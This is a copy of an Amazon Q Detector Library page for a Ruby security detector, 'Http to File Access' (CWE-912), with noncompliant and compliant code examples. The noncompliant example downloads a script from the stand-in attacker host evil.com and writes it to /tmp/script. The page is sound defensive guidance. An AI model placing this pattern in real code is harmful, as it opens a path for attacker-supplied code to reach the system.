---
title: "Http to File Access High"
---

![AWS logo](https://docs.aws.amazon.com/amazonq/detector-library/_next/static/media/aws-logo.506636a4.svg)

[Amazon QDetector Library](../../detector-library.md) [Sign in to Amazon Q](https://console.aws.amazon.com/amazonq/home)

#### Amazon Q

###### Detector Library

#### Ruby detectors(21/21)

[SQL Injection](sql-injection.md) [Divide by Zero](divide-by-zero.md) [Sensitive HTTP Action](sensitive-http-action.md) [Insufficient Protected Credentials](insufficiently-protected-credentials.md) [Sensitive Information Leak](sensitive-information-leak.md) [Untrusted Deserialization](untrusted-deserialization.md) [Log Injection](log-injection.md) [XML External Entity](xml-external-entity.md) [Path Injection](path-traversal.md) [Http to File Access](http-to-file-access.md) [Code Injection](code-injection.md) [OS Command Injection](os-command-injection.md) [Resource leak](resource-leak.md) [Cross Site Scripting (XSS)](cross-site-scripting.md) [Untrusted Open](untrusted-file-open.md) [Improper Input Validation](improper-input-validation.md) [Stack Trace Exposure](stack-trace-exposure.md) [Improper Certificate Validation](improper-certificate-validation.md) [send\_file Injection](sendfile-injection.md) [Unsafe File Permissions](loose-file-permissions.md) [Tainted Format](tainted-format.md)

# Http to File Access [High](severity/high.md)

Writing to a local file from http access may hide unintended functionality. This type of behavior may hide malicious code, and introduces a new vector for attacks.

**Detector ID**

ruby/http-to-file-access@v1.0

**Category**

[Security](categories/security.md)

**Common Weakness Enumeration (CWE)![external icon](https://docs.aws.amazon.com/amazonq/detector-library/_next/static/media/external.cdeb5c57.svg)**

[CWE-912](https://cwe.mitre.org/data/definitions/912.html)

**Tags**

-

* * *

#### Noncompliant example

```ruby
1def http_file_access_noncompliant
2  resp = Net::HTTP.new("evil.com").get("/script").body
3  file = File.open("/tmp/script", "w")
4  # Noncompliant: Writing a file from http access.
5  file.write(resp)
6end
```

#### Compliant example

```ruby
1def http_file_access_compliant
2  a = "a"
3  file = File.open("/tmp/script", "w")
4  # Compliant: Not using any http access to write in file.
5  file.write(a)
6end
```

All content copied from https://docs.aws.amazon.com/.
